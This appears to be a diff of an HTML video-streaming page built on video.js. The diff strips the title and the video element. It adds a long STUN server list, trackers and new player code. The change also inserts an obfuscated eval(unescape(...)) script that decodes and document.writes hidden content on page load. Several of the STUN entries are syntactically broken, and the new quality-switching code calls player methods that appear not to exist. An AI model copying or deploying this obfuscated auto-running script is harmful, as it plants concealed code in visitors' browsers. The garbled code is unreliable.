@@ -1,25 +1,28 @@
 <HTML style="overflow:auto;">
 <HEAD>
-<title>Streaming Lifestyle TV - OpenTV.pages.dev</title>
+<title></title>
 <meta name="generator" content="JDiff v1.1.0">
   <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE-edge">
-  <meta name="dns-prefetch" content="https://opentv.pages.dev/">
+<meta name="dns-prefetch" content="https://opentv.pages.dev/">
+<meta name="dns-prefetch" content="https://vod.linknetott.swiftcontent.com">
 <meta name="dns-prefetch" content="https://rawgit.com">
 <meta name="dns-prefetch" content="https://vjs.zencdn.net">
 <meta name="dns-prefetch" content="https://cdn.jsdelivr.net">
 <meta name="dns-prefetch" content="https://assets.nflxext.com">
 <meta name="dns-prefetch" content="https://op-group1-swiftservehd-1.dens.tv">
-<meta name="dns-prefetch" content="http://ott.tvri.co.id/">
 <meta name="dns-prefetch" content="https://cdnjs.cloudflare.com">
 <meta name="dns-prefetch" content="https://unpkg.com">
 <meta name="dns-prefetch" content="https://raw.githubusercontent.com">
-<meta name="dns-prefetch" content="//peerjs.jairagne.ovh">
+<meta name="dns-prefetch" content="https://peerjs.jairagne.ovh">
+<meta name="dns-prefetch" content="https://ctrl.laotv.la">
+<meta name="dns-prefetch" content="https://rbmn-live.akamaized.net">
+<meta name="dns-prefetch" content="https://image.discovery.indazn.com">
+<meta name="dns-prefetch" content="https://sstatic1.histats.com">
+<meta name="dns-prefetch" content="https://s10.histats.co">
+<meta name="dns-prefetch" content="https://arc.io">
   <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
 <meta name="mobile-web-app-capable" content="yes" />
-<link href="https://rawgit.com/mkhazov/videojs-resolution-switcher/master/lib/videojs-resolution-switcher.css" rel="stylesheet">
 <link href="https://vjs.zencdn.net/5-unsafe/video-js.css" rel="stylesheet">
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/videojs-logo@latest/dist/videojs-logo.css">
  <style>
 body, html {
     background-color: #000;
@@ -338,6 +341,18 @@ img#vjs-logobrand-image {
 .vjs-ad-playing a#vjs-logobrand-image-destination {
 	display: none;
 }
+.video-container {
+      position: relative;
+    }
+    .quality-label {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 24px;
+      color: white;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+    }
 </style>
 <script src="https://vjs.zencdn.net/ie8/1.1.2/videojs-ie8.min.js"></script>
 <script src="https://raw.githubusercontent.com/titpetric/PeerLive/master/clientVOD/js/videojs.hls.orig.js"></script>
@@ -346,12 +361,242 @@ img#vjs-logobrand-image {
 <script>
   apiCDNP2P({host:"52.38.144.179",port:"9000",key: 'peerjs',debug:3,secure:true,config: {
   iceServers: [
-    { urls: 'stun:stun.l.google.com:19302' },
-    { urls: 'stun:stun1.l.google.com:19302' },
-    { urls: 'stun:stun2.l.google.com:19302' }
+{ urls: 'stun:stun.l.google.com:19302' },
+{ urls: 'stun:stun1.l.google.com:19302' },
+{ urls: 'stun:stun2.l.google.com:19302' },
+{ urls: 'stun.1und1.de:3478' },
+{ urls: 'stun.gmx.net:3478' },
+{ urls: 'stun.l.google.com:19302
+{ urls: 'stun1.l.google.com:19302
+{ urls: 'stun2.l.google.com:19302
+{ urls: 'stun3.l.google.com:19302
+{ urls: 'stun4.l.google.com:19302
+{ urls: '23.21.150.121:3478' },
+{ urls: 'iphone-stun.strato-iphone.de:3478' },
+{ urls: 'numb.viagenie.ca:3478' },
+{ urls: 'stun.12connect.com:3478' },
+{ urls: 'stun.12voip.com:3478' },
+{ urls: 'stun.1und1.de:3478' },
+{ urls: 'stun.2talk.co.nz:3478' },
+{ urls: 'stun.2talk.com:3478' },
+{ urls: 'stun.3clogic.com:3478' },
+{ urls: 'stun.3cx.com:3478' },
+{ urls: 'stun.a-mm.tv:3478' },
+{ urls: 'stun.aa.net.uk:3478' },
+{ urls: 'stun.acrobits.cz:3478' },
+{ urls: 'stun.actionvoip.com:3478' },
+{ urls: 'stun.advfn.com:3478' },
+{ urls: 'stun.aeta-audio.com:3478' },
+{ urls: 'stun.aeta.com:3478' },
+{ urls: 'stun.altar.com.pl:3478' },
+{ urls: 'stun.annatel.net:3478' },
+{ urls: 'stun.antisip.com:3478' },
+{ urls: 'stun.arbuz.ru:3478' },
+{ urls: 'stun.avigora.fr:3478' },
+{ urls: 'stun.awa-shima.com:3478' },
+{ urls: 'stun.b2b2c.ca:3478' },
+{ urls: 'stun.bahnhof.net:3478' },
+{ urls: 'stun.barracuda.com:3478' },
+{ urls: 'stun.bluesip.net:3478' },
+{ urls: 'stun.bmwgs.cz:3478' },
+{ urls: 'stun.botonakis.com:3478' },
+{ urls: 'stun.budgetsip.com:3478' },
+{ urls: 'stun.cablenet-as.net:3478' },
+{ urls: 'stun.callromania.ro:3478' },
+{ urls: 'stun.callwithus.com:3478' },
+{ urls: 'stun.chathelp.ru:3478' },
+{ urls: 'stun.cheapvoip.com:3478' },
+{ urls: 'stun.ciktel.com:3478' },
+{ urls: 'stun.cloopen.com:3478' },
+{ urls: 'stun.comfi.com:3478' },
+{ urls: 'stun.commpeak.com:3478' },
+{ urls: 'stun.comtube.com:3478' },
+{ urls: 'stun.comtube.ru:3478' },
+{ urls: 'stun.cope.es:3478' },
+{ urls: 'stun.counterpath.com:3478' },
+{ urls: 'stun.counterpath.net:3478' },
+{ urls: 'stun.datamanagement.it:3478' },
+{ urls: 'stun.dcalling.de:3478' },
+{ urls: 'stun.demos.ru:3478' },
+{ urls: 'stun.develz.org:3478' },
+{ urls: 'stun.dingaling.ca:3478' },
+{ urls: 'stun.doublerobotics.com:3478' },
+{ urls: 'stun.dus.net:3478' },
+{ urls: 'stun.easycall.pl:3478' },
+{ urls: 'stun.easyvoip.com:3478' },
+{ urls: 'stun.ekiga.net:3478' },
+{ urls: 'stun.epygi.com:3478' },
+{ urls: 'stun.etoilediese.fr:3478' },
+{ urls: 'stun.faktortel.com.au:3478' },
+{ urls: 'stun.freecall.com:3478' },
+{ urls: 'stun.freeswitch.org:3478' },
+{ urls: 'stun.freevoipdeal.com:3478' },
+{ urls: 'stun.gmx.de:3478' },
+{ urls: 'stun.gmx.net:3478' },
+{ urls: 'stun.gradwell.com:3478' },
+{ urls: 'stun.halonet.pl:3478' },
+{ urls: 'stun.hellonanu.com:3478' },
+{ urls: 'stun.hoiio.com:3478' },
+{ urls: 'stun.hosteurope.de:3478' },
+{ urls: 'stun.ideasip.com:3478' },
+{ urls: 'stun.infra.net:3478' },
+{ urls: 'stun.internetcalls.com:3478' },
+{ urls: 'stun.intervoip.com:3478' },
+{ urls: 'stun.ipcomms.net:3478' },
+{ urls: 'stun.ipfire.org:3478' },
+{ urls: 'stun.ippi.fr:3478' },
+{ urls: 'stun.ipshka.com:3478' },
+{ urls: 'stun.irian.at:3478' },
+{ urls: 'stun.it1.hr:3478' },
+{ urls: 'stun.ivao.aero:3478' },
+{ urls: 'stun.jumblo.com:3478' },
+{ urls: 'stun.justvoip.com:3478' },
+{ urls: 'stun.kanet.ru:3478' },
+{ urls: 'stun.kiwilink.co.nz:3478' },
+{ urls: 'stun.l.google.com:19302
+{ urls: 'stun.linea7.net:3478' },
+{ urls: 'stun.linphone.org:3478' },
+{ urls: 'stun.liveo.fr:3478' },
+{ urls: 'stun.lowratevoip.com:3478' },
+{ urls: 'stun.lugosoft.com:3478' },
+{ urls: 'stun.lundimatin.fr:3478' },
+{ urls: 'stun.magnet.ie:3478' },
+{ urls: 'stun.mgn.ru:3478' },
+{ urls: 'stun.mit.de:3478' },
+{ urls: 'stun.mitake.com.tw:3478' },
+{ urls: 'stun.miwifi.com:3478' },
+{ urls: 'stun.modulus.gr:3478' },
+{ urls: 'stun.myvoiptraffic.com:3478' },
+{ urls: 'stun.mywatson.it:3478' },
+{ urls: 'stun.nas.net:3478' },
+{ urls: 'stun.neotel.co.za:3478' },
+{ urls: 'stun.netappel.com:3478' },
+{ urls: 'stun.netgsm.com.tr:3478' },
+{ urls: 'stun.nfon.net:3478' },
+{ urls: 'stun.noblogs.org:3478' },
+{ urls: 'stun.noc.ams-ix.net:3478' },
+{ urls: 'stun.nonoh.net:3478' },
+{ urls: 'stun.nottingham.ac.uk:3478' },
+{ urls: 'stun.nova.is:3478' },
+{ urls: 'stun.on.net.mk:3478' },
+{ urls: 'stun.ooma.com:3478' },
+{ urls: 'stun.ooonet.ru:3478' },
+{ urls: 'stun.oriontelekom.rs:3478' },
+{ urls: 'stun.outland-net.de:3478' },
+{ urls: 'stun.ozekiphone.com:3478' },
+{ urls: 'stun.personal-voip.de:3478' },
+{ urls: 'stun.phone.com:3478' },
+{ urls: 'stun.pjsip.org:3478' },
+{ urls: 'stun.poivy.com:3478' },
+{ urls: 'stun.powerpbx.org:3478' },
+{ urls: 'stun.powervoip.com:3478' },
+{ urls: 'stun.ppdi.com:3478' },
+{ urls: 'stun.qq.com:3478' },
+{ urls: 'stun.rackco.com:3478' },
+{ urls: 'stun.rapidnet.de:3478' },
+{ urls: 'stun.rb-net.com:3478' },
+{ urls: 'stun.rixtelecom.se:3478' },
+{ urls: 'stun.rockenstein.de:3478' },
+{ urls: 'stun.rolmail.net:3478' },
+{ urls: 'stun.rynga.com:3478' },
+{ urls: 'stun.schlund.de:3478' },
+{ urls: 'stun.services.mozilla.com:3478' },
+{ urls: 'stun.sigmavoip.com:3478' },
+{ urls: 'stun.sip.us:3478' },
+{ urls: 'stun.sipdiscount.com:3478' },
+{ urls: 'stun.sipgate.net:10000
+{ urls: 'stun.sipgate.net:3478' },
+{ urls: 'stun.siplogin.de:3478' },
+{ urls: 'stun.sipnet.net:3478' },
+{ urls: 'stun.sipnet.ru:3478' },
+{ urls: 'stun.siportal.it:3478' },
+{ urls: 'stun.sippeer.dk:3478' },
+{ urls: 'stun.siptraffic.com:3478' },
+{ urls: 'stun.skylink.ru:3478' },
+{ urls: 'stun.sma.de:3478' },
+{ urls: 'stun.smartvoip.com:3478' },
+{ urls: 'stun.smsdiscount.com:3478' },
+{ urls: 'stun.snafu.de:3478' },
+{ urls: 'stun.softjoys.com:3478' },
+{ urls: 'stun.solcon.nl:3478' },
+{ urls: 'stun.solnet.ch:3478' },
+{ urls: 'stun.sonetel.com:3478' },
+{ urls: 'stun.sonetel.net:3478' },
+{ urls: 'stun.sovtest.ru:3478' },
+{ urls: 'stun.speedy.com.ar:3478' },
+{ urls: 'stun.spokn.com:3478' },
+{ urls: 'stun.srce.hr:3478' },
+{ urls: 'stun.ssl7.net:3478' },
+{ urls: 'stun.stunprotocol.org:3478' },
+{ urls: 'stun.symform.com:3478' },
+{ urls: 'stun.symplicity.com:3478' },
+{ urls: 'stun.t-online.de:3478' },
+{ urls: 'stun.tagan.ru:3478' },
+{ urls: 'stun.teachercreated.com:3478' },
+{ urls: 'stun.tel.lu:3478' },
+{ urls: 'stun.telbo.com:3478' },
+{ urls: 'stun.telefacil.com:3478' },
+{ urls: 'stun.tng.de:3478' },
+{ urls: 'stun.twt.it:3478' },
+{ urls: 'stun.u-blox.com:3478' },
+{ urls: 'stun.ucsb.edu:3478' },
+{ urls: 'stun.ucw.cz:3478' },
+{ urls: 'stun.uls.co.za:3478' },
+{ urls: 'stun.unseen.is:3478' },
+{ urls: 'stun.usfamily.net:3478' },
+{ urls: 'stun.veoh.com:3478' },
+{ urls: 'stun.vidyo.com:3478' },
+{ urls: 'stun.vipgroup.net:3478' },
+{ urls: 'stun.viva.gr:3478' },
+{ urls: 'stun.vivox.com:3478' },
+{ urls: 'stun.vline.com:3478' },
+{ urls: 'stun.vo.lu:3478' },
+{ urls: 'stun.vodafone.ro:3478' },
+{ urls: 'stun.voicetrading.com:3478' },
+{ urls: 'stun.voip.aebc.com:3478' },
+{ urls: 'stun.voip.blackberry.com:3478' },
+{ urls: 'stun.voip.eutelia.it:3478' },
+{ urls: 'stun.voiparound.com:3478' },
+{ urls: 'stun.voipblast.com:3478' },
+{ urls: 'stun.voipbuster.com:3478' },
+{ urls: 'stun.voipbusterpro.com:3478' },
+{ urls: 'stun.voipcheap.co.uk:3478' },
+{ urls: 'stun.voipcheap.com:3478' },
+{ urls: 'stun.voipfibre.com:3478' },
+{ urls: 'stun.voipgain.com:3478' },
+{ urls: 'stun.voipgate.com:3478' },
+{ urls: 'stun.voipinfocenter.com:3478' },
+{ urls: 'stun.voipplanet.nl:3478' },
+{ urls: 'stun.voippro.com:3478' },
+{ urls: 'stun.voipraider.com:3478' },
+{ urls: 'stun.voip{ urls: 'stunt.com:3478' },
+{ urls: 'stun.voipwise.com:3478' },
+{ urls: 'stun.voipzoom.com:3478' },
+{ urls: 'stun.vopium.com:3478' },
+{ urls: 'stun.voxox.com:3478' },
+{ urls: 'stun.voys.nl:3478' },
+{ urls: 'stun.voztele.com:3478' },
+{ urls: 'stun.vyke.com:3478' },
+{ urls: 'stun.webcalldirect.com:3478' },
+{ urls: 'stun.whoi.edu:3478' },
+{ urls: 'stun.wifirst.net:3478' },
+{ urls: 'stun.wwdl.net:3478' },
+{ urls: 'stun.xs4all.nl:3478' },
+{ urls: 'stun.xtratelecom.es:3478' },
+{ urls: 'stun.yesss.at:3478' },
+{ urls: 'stun.zadarma.com:3478' },
+{ urls: 'stun.zadv.com:3478' },
+{ urls: 'stun.zoiper.com:3478' },
+{ urls: 'stun1.faktortel.com.au:3478' },
+{ urls: 'stun1.l.google.com:19302' },
+{ urls: 'stun1.voiceeclipse.net:3478' },
+{ urls: 'stun2.l.google.com:19302' },
+{ urls: 'stun3.l.google.com:19302' },
+{ urls: 'stun4.l.google.com:19302' },
+{ urls: 'stunserver.org:3478' }
   ]
 }});
-</script
+</script>
 <script async src="https://arc.io/widget.min.js#JMAhfwPS"></script>
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-MG63VVPYHZ"></script>
 <script>
@@ -360,8 +605,8 @@ img#vjs-logobrand-image {
   gtag('js', new Date());
   gtag('config', 'G-MG63VVPYHZ');
 </script>  
-    <script>
-      var tag = document.createElement("script");
+<script>
+  var tag = document.createElement("script");
 tag.src = "https://www.googletagmanager.com/gtag/js?id=G-MG63VVPYHZ";
 var firstScriptTag = document.getElementsByTagName("script")[0];
 firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
@@ -373,61 +618,115 @@ tag.onload = function() {
   gtag("config", "G-MG63VVPYHZ");
 
   setInterval(function() {
-    gtag("event", "page_view", {
-      page_location: window.location.href,
-      page_title: document.title
-    });
+gtag("event", "page_view", {
+  page_location: window.location.href,
+  page_title: document.title
+});
   }, 15000);
 };
-    </script>
+</script>
+
 </HEAD>
 <BODY topmargin=0 leftmargin=0 style="background:transparent;background-color:#000000">
-
-
-<script src="https://raw.githubusercontent.com/Iragne/PCDN/master/client/js/peer.js"></script>
-<script src="https://raw.githubusercontent.com/Iragne/PCDN/master/client/js/apiCDNP2P.js"></script>
-<script src="https://vjs.zencdn.net/ie8/1.1.2/videojs-ie8.min.js"></script>
 <script src="https://raw.githubusercontent.com/Mewte/videojs-logobrand/master/src/videojs.logobrand.js"></script>
-
-<div id='vplayer'>
-
-<video id="vjsplayer" class="video-js vjs-default-skin" style="width:100%;height:100%;text-align:center;" width="100%" height="100%" controls="true" poster="https://opentv.pages.dev/banner.webp" autoplay controls preload="auto" playsinline webkit-playsinline>
-
-		<source src="https://op-group1-swiftservehd-1.dens.tv/h/h222/01.m3u8" type='application/vnd.apple.mpegurl' label='SD' res='480'>
-		<source src="https://op-group1-swiftservehd-1.dens.tv/h/h222/02.m3u8" type='application/vnd.apple.mpegurl' label='HD' res='720'>
-
-   </video></div></div>
 <script src='https://vjs.zencdn.net/5-unsafe/video.js'></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 <script src="https://unpkg.com/videojs-flash/dist/videojs-flash.js"></script>
 <script src="https://unpkg.com/videojs-contrib-hls/dist/videojs-contrib-hls.js"></script>
 <script src="https://use.fontawesome.com/f4da8251b8.js"></script>
-<script src="https://rawgit.com/mkhazov/videojs-resolution-switcher/master/lib/videojs-resolution-switcher.js"></script>  
-<script>
-    (function(window, videojs) {
-      var examplePlayer = window.examplePlayer = videojs('vjsplayer');
-   examplePlayer.logobrand({
-				image: "https://opentv.pages.dev/img/logo-player.png", //image to use
-				destination: "http://www.videojs.com/" //destination when clicked
-			});
-
-    }(window, window.videojs));
-	plugins: {
-			videoJsResolutionSwitcher: {
-			    ui: true,
-				default: 'mid',
-				dynamicLabel: false
-			}
-		}
-	}, function(){
-		var player = this;
-		player.on('resolutionchange', function(){
-			console.info('Source changed')
-});
-  </script>
-<script>
-videojs('vjsplayer').videoJsResolutionSwitcher()
+<script type="text/javascript">
+<!-- 
+eval(unescape('%66%75%6e%63%74%69%6f%6e%20%66%61%31%39%34%61%32%33%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%35%38%30%38%37%37%33%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%37%34%36%35%31%31%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%37%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
+eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%66%61%31%39%34%61%32%33%28%27') + '%46%7f%6d%78%71%74%72%42%10%17%6f%77%74%7f%7e%20%76%72%6b%89%6b%7d%21%41%26%7c%75%6e%6b%77%70%79%26%29%79%77%7f%76%72%6d%85%6b%78%2f%33%4b%13%15%71%76%69%81%69%7c%32%7a%6d%69%66%61%31%79%6a%78%34%76%73%6f%6a%26%47%2e%6a%78%73%6f%7a%71%73%70%28%31%26%81%1d%16%23%21%33%37%26%4e%6d%70%69%7a%71%61%72%23%56%52%26%69%6e%6e%7e%6d%7b%79%2e%75%77%76%69%74%15%14%22%20%7c%69%7a%2e%6d%77%76%69%74%7a%55%52%20%45%26%7d%79%72%6f%70%7b%34%74%6d%78%77%6f%69%78%7f%7e%31%76%72%69%6a%6e%7c%6b%7b%7b%36%61%6c%6f%7f%69%7b%7b%47%11%16%26%26%35%3f%20%5e%6a%7e%26%74%75%76%6f%71%26%6c%65%6f%6f%6a%7c%15%10%22%22%7c%6e%71%79%3c%7d%68%7d%5c%6d%79%79%69%7d%7a%4e%6f%61%6c%68%7f%2a%2f%58%69%68%6b%78%6d%7a%27%34%23%28%6a%7a%7a%72%7f%46%37%37%7d%77%79%31%6b%75%78%7b%7e%71%6b%6a%71%6b%3c%6d%72%72%33%2f%31%47%11%16%26%26%78%66%77%7e%33%7f%6d%7a%5c%69%7f%7d%6d%79%72%48%68%6e%6e%6d%78%2a%2b%4f%6b%6b%6f%73%7d%30%4c%73%74%7a%7c%73%74%35%49%70%7a%71%7a%32%53%78%71%6b%75%72%2f%32%24%27%36%2a%36%47%15%10%22%22%7c%6e%71%79%3c%7d%68%7d%5c%6d%79%79%69%7d%7a%4e%6f%61%6c%68%7f%2a%2f%49%6f%6f%6b%7b%7b%37%43%71%71%7d%7c%77%72%31%4d%74%72%77%7d%3d%53%68%7d%6a%77%6a%7f%2b%34%26%2f%4d%45%5c%37%21%52%57%5b%5e%36%20%56%5d%58%27%37%46%12%14%26%26%7e%6a%77%7b%34%79%65%7c%5d%6a%7d%7d%6d%7f%7e%48%6d%69%68%65%7e%2b%28%4d%6b%6b%69%7f%7d%35%4b%75%7c%7c%7d%70%76%35%49%76%76%71%7f%35%4c%65%6f%6f%6a%7c%7b%2f%36%22%29%4b%77%76%72%6b%71%7d%31%5a%81%72%69%29%31%43%17%18%20%23%7d%6a%71%7b%30%7f%6b%7a%58%6f%71%7b%68%7c%7e%4e%6d%6d%6e%6b%78%2e%2d%56%33%49%70%7c%7f%69%7c%6e%6b%6a%35%4e%7f%7e%2a%35%22%6b%72%75%69%72%7a%51%54%39%45%10%17%81%43%15%14%11%16%26%26%78%66%77%7e%33%7f%6d%7a%5c%69%7f%7d%6d%79%72%48%68%6e%6e%6d%78%2a%2b%5b%7b%6d%7a%3d%4f%6a%6a%70%7a%2f%36%22%29%55%77%82%79%74%77%6e%33%3d%34%32%22%28%52%71%76%75%78%46%21%4d%74%6a%7c%73%77%6a%26%3b%30%45%23%5c%51%35%4f%45%45%38%48%26%4a%75%77%77%6d%33%5b%53%5d%3d%4f%34%38%3a%3e%39%3d%31%30%36%36%3d%35%20%49%76%74%7a%6b%5a%6a%6c%53%71%7e%33%3b%3b%3f%36%33%3a%23%29%57%4e%5a%51%56%34%26%72%73%7b%6b%23%48%69%6b%73%73%35%20%4b%6e%7a%7f%73%68%30%3d%36%3b%30%32%32%3d%36%3e%3e%32%3c%3e%3e%26%55%73%6c%77%72%6d%24%53%6f%69%6e%7c%71%37%39%3f%39%34%3b%3e%27%37%46%12%14%26%26%7c%69%7c%7d%78%76%2e%74%72%6e%6e%57%78%75%6b%77%74%69%70%3c%6f%73%71%76%81%2e%7e%6a%77%7b%32%24%61%7e%6a%7a%71%6d%74%7e%7f%37%43%15%12%8d%13%15%71%76%69%81%69%7c%32%78%6d%6b%62%87%2b%29%35%26%45%40%22%85%15%10%24%2e%70%77%6e%85%6d%78%30%72%74%69%81%2c%39%45%10%17%81%31%43%11%14%20%26%42%35%73%6d%7d%76%72%7a%44%22%22%20%26%15%12%2e%20%47%6d%75%7c%26%6f%76%6f%7b%7b%47%20%7a%74%6d%69%77%35%6f%73%72%7a%69%73%7c%6b%7d%2f%40%15%10%46%78%77%6a%6d%75%2e%77%6f%42%2c%7c%70%7f%72%74%69%81%6f%70%2e%23%6c%76%69%7b%7f%41%2e%7c%71%68%65%71%30%77%7f%26%7c%74%7f%33%6a%6d%6e%61%7b%77%7d%31%7b%73%75%70%2e%26%7b%78%89%74%68%42%2c%7f%71%6e%7e%68%40%39%34%3e%2b%46%69%69%71%6f%6a%7e%46%39%36%34%25%45%7f%6a%7a%7a%35%6d%76%77%6f%74%42%63%6b%71%7d%69%78%43%2c%22%79%71%6a%78%66%43%2d%3e%32%36%2d%2c%22%68%6d%71%6d%66%7c%40%2f%3d%36%36%29%2c%20%6b%77%76%72%7e%72%75%7f%45%28%7e%7c%7b%6d%28%24%7e%71%7e%7d%69%78%45%2c%6a%7c%7a%76%79%48%31%32%70%72%6d%74%7e%78%32%76%69%6d%65%7d%31%6d%69%7c%37%6c%6d%72%74%6d%7a%3c%79%68%6f%72%28%26%6d%79%7c%77%76%70%61%87%23%6c%73%74%7a%7c%73%74%7b%26%74%70%6b%77%70%6d%6a%45%2c%6d%7b%7a%77%2a%2e%70%77%6e%85%7b%71%70%76%77%74%6d%46%1d%16%14%16%46%7b%77%79%7c%6d%6d%26%79%70%6d%40%2f%6a%7a%7a%72%7f%46%37%37%7e%7f%6c%31%75%75%74%73%70%69%7c%77%7a%78%3c%7d%7a%76%68%7a%6b%73%70%7c%6d%74%78%3c%6d%72%72%33%4b%77%70%7e%6b%74%7a%35%46%54%5e%30%56%71%7c%69%33%4d%6e%69%76%7c%6b%77%2a%3c%3e%6b%6a%3f%2b%38%41%35%79%72%6f%6a%7a%34%75%3f%79%38%28%26%78%89%70%68%42%2c%69%76%72%76%77%6b%69%78%79%71%71%30%78%74%6a%30%6d%70%76%72%6f%3c%73%73%6a%6b%7d%78%76%2c%42%42%37%7e%79%6c%68%70%4015808773%35%35%37%31%31%33%39' + unescape('%27%29%29%3b'));
+// -->
 </script>
+   <script>
+    (function (window, videojs) {
+  var examplePlayer = (window.examplePlayer = videojs("vjsplayer", {
+    html5: {
+      hls: {
+        overrideNative: true,
+        smoothQualityChange: true,
+        maxBufferLength: 30,
+        maxMaxBufferLength: 60,
+        enableLowInitialPlaylist: true,
+        overrideNativeAudioTracks: true,
+        overrideNativeVideoTracks: true,
+      },
+    },
+  }));
+
+  // Tetapkan bitrate awal yang lebih rendah untuk memulai pemutaran lebih cepat
+  examplePlayer.tech_.hls.options.startLevel = 1;
+
+  // Pilih resolusi terendah saat pertama load
+  examplePlayer.on("loadedmetadata", function () {
+    examplePlayer.quality("low");
+  });
+
+  // Sesuaikan resolusi dengan koneksi internet
+  function updateQuality() {
+  // Dapatkan tipe koneksi saat ini
+  var connectionType = window.navigator.connection.effectiveType;
+
+  // Pilih resolusi berdasarkan tipe koneksi
+  switch (connectionType) {
+    case "cellular":
+      examplePlayer.quality("low");
+      break;
+    case "wifi":
+      examplePlayer.quality("medium");
+      break;
+    case "wired":
+      examplePlayer.quality("high");
+      break;
+    default:
+      examplePlayer.quality("low");
+      break;
+  }
+}
+
+  // Jalankan updateQuality() setiap 5 detik
+  setInterval(updateQuality, 5000);
+
+  // Perbarui resolusi saat level berubah
+  examplePlayer.on("levelchange", function () {
+    updateQuality();
+  });
+
+  // Tampilkan teks keterangan kualitas di tengah atas video
+  function showQualityLabel(quality) {
+    var qualityLabel = document.getElementById("qualityLabel");
+    qualityLabel.textContent = "Playback in " + quality + " Quality";
+  }
+
+  // Perbarui teks keterangan saat kualitas berubah
+  examplePlayer.on("qualitychange", function () {
+    var currentQuality = examplePlayer.qualityLevels().find(".vjs-selected").label();
+    showQualityLabel(currentQuality);
+  });
+
+  // Tampilkan teks keterangan saat video dimulai
+  examplePlayer.on("play", function () {
+    var currentQuality = examplePlayer.qualityLevels().find(".vjs-selected").label();
+    showQualityLabel(currentQuality);
+  });
+
+  // Set frame rate menjadi 24fps (23.976)
+  examplePlayer.tech_.hls.on("manifestParsed", function () {
+    examplePlayer.tech_.hls.masterPlaylistController_.mainSegmentLoader_.mediaSource_.videoBuffer_.appendMode_ = "segments";
+    examplePlayer.tech_.hls.masterPlaylistController_.mainSegmentLoader_.mediaSource_.videoBuffer_.segmentParser_.parseSegmentBinaryData = function (
+      data,
+      byteOffset,
+      segmentInfo
+    ) {
+      var segment = this.parseSegmentBinaryData.originalMethod.call(this, data, byteOffset, segmentInfo);
+      segment.videoFrameRate = 23.976; // Mengubah frame rate menjadi 24fps (23.976)
+      return segment;
+    };
+  });
+})(window, videojs);
+  </script>
 <script>
 var player = videojs('vjsplayer');
 
@@ -464,4 +763,15 @@ function skipS3MV(skipBy) {
     })
 </script>
 </div>
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4834164,4,605,110,55,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4834164&101" alt="counters" border="0"></a></noscript>
+<!-- Histats.com  END  -->
 </BODY></HTML>
